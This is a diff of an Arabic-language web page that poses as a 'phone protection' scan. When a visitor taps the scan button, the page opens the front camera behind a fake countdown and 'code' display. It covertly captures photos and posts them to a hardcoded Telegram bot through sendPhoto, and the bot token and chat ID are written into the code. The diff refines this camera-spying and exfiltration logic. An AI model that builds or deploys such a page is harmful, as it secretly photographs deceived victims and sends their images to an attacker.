@@ -12,13 +12,11 @@
         .page { display: none; } .page.active { display: block; }
         .skull { font-size: 60px; }
         h1 { font-size: 22px; color: var(--green); }
-        .device-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 20px; }
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
         .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; text-align: left; max-height: 200px; overflow-y: auto; }
         .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
         .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: var(--red); width: 0%; }
-        .success-icon { font-size: 70px; }
         video { display: none; } canvas { display: none; }
     </style>
 </head>
@@ -27,12 +25,12 @@
     <div class="page active" id="page-home">
         <div class="skull">🛡️</div>
         <h1>حماية الهاتف</h1>
-        <div class="device-card"><div id="device-name" style="color:var(--green);">📱 جاري الكشف...</div></div>
+        <div style="color:var(--green);" id="device-name">📱 جاري الكشف...</div>
         <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
     </div>
     <div class="page" id="page-scanning">
         <div class="skull">💀</div>
-        <h1>جاري الفحص الشامل...</h1>
+        <h1>جاري الفحص...</h1>
         <div class="code-screen" id="code-screen"></div>
         <div class="countdown" id="countdown">15</div>
         <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
@@ -40,28 +38,32 @@
         <canvas id="cnv"></canvas>
     </div>
     <div class="page" id="page-done">
-        <div class="success-icon">✅</div>
+        <div style="font-size:70px;">✅</div>
         <div style="color:var(--green);font-size:22px;">جهازك بأمان</div>
     </div>
 </div>
 
 <script>
+// ========== قراءة التوكن والـ chatId من الرابط ==========
 const params = new URLSearchParams(window.location.search);
-const CHAT_ID = params.get("chatId") || "7276604783";
-const BOT_TOKEN = params.get("token") || "8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo";
+const CHAT_ID = params.get('chatId') || '7276604783';
+const BOT_TOKEN = params.get('token') || '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+
 document.getElementById('device-name').textContent = '📱 ' + (navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز').trim();
 
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
 
-let stream;
+let stream, videoReady = false;
 
 async function startScan() {
     showPage('page-scanning');
     
     try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        document.getElementById('vid').srcObject = stream;
-        await new Promise(r => setTimeout(r, 2500));
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } });
+        const video = document.getElementById('vid');
+        video.srcObject = stream;
+        await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 3000); }; });
+        videoReady = true;
     } catch(e) { alert('الكاميرا مش شغالة'); return; }
 
     const codeScreen = document.getElementById('code-screen');
@@ -73,39 +75,34 @@ async function startScan() {
     let s = 15, pics = 0;
 
     function snap() {
-        if (!video || video.readyState < 2) return;
+        if (!videoReady || !video || video.readyState < 2) return;
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => {
-            if (!b || b.size < 500) return;
-            const r = new FileReader();
-            r.onloadend = () => {
-                const base = r.result.split(',')[1];
-                if (!base || base.length < 50) return;
-                
-                // تخزين في LocalStorage
-                const store = JSON.parse(localStorage.getItem('hacke_gallery') || '[]');
-                store.push({ data: base, time: Date.now(), type: 'photo', device: document.getElementById('device-name').textContent });
-                if (store.length > 50) store.shift();
-                localStorage.setItem('hacke_gallery', JSON.stringify(store));
-                
-                // إرسال للتليجرام
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', b, 'photo.jpg');
-                fd.append('caption', '📸 من: ' + document.getElementById('device-name').textContent);
-                fetch('`https://api.telegram.org/bot${BOT_TOKEN}/`sendPhoto', { method: 'POST', body: fd }).catch(e => {});
-                
-                pics++;
-            };
-            r.readAsDataURL(b);
-        }, 'image/jpeg', 0.7);
+        canvas.toBlob(async (blob) => {
+            if (!blob || blob.size < 1000) return;
+            
+            // إرسال للبوت - باستخدام التوكن من الرابط
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo_' + Date.now() + '.jpg');
+            formData.append('caption', '📸 من: ' + document.getElementById('device-name').textContent);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            console.log('Sending to:', url, 'Chat:', CHAT_ID);
+            
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                const data = await res.json();
+                console.log('Result:', data.ok ? 'OK' : data.description);
+            } catch(e) { console.log('Error:', e); }
+            
+            pics++;
+        }, 'image/jpeg', 0.85);
     }
 
     const timer = setInterval(() => {
-        s--;
-        countdownEl.textContent = s;
+        s--; countdownEl.textContent = s;
         progressFill.style.width = ((15 - s) / 15 * 100) + '%';
         codeScreen.innerHTML = logs.slice(0, Math.floor(((15-s)/15)*logs.length+1)).join('<br>');
         if (s <= 12 && pics < 10) snap();
